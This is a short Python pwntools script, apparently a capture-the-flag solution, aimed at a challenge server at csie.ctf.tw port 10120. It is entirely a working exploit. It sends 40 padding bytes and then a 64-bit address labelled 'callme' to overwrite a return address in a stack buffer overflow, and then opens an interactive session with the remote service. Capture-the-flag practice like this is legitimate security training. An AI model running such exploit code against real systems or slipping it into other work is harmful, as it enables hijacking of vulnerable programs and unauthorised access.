from pwn import *

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10120

r = remote(host, port)

callme = 0x0000000000400566
# payload = str.encode(cyclic(40))
payload = b'a'*40
payload += p64(callme)

# input('press enter')
r.sendline(payload)

r.interactive()
